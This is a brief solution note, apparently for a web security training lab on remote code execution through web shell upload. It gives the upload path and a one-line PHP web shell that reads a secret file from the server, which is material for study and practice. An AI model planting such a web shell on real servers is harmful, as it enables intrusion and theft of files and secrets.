# Lab: Remote code execution via web shell upload
Solution: 
- Uploaded file is stored at `/files/avatars/`
- I tried uploading an interactive webshell but it wasn't working
- Use the following webshell to directly read the contents of the file:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```